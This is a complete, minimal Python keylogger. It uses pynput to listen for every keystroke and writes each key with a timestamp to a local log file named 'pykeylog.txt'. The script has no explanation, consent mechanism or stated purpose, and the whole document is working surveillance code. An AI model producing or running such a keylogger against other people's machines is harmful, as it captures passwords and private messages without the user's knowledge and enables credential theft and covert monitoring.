from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("pykeylog.txt"),
    level=logging.DEBUG,
    format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
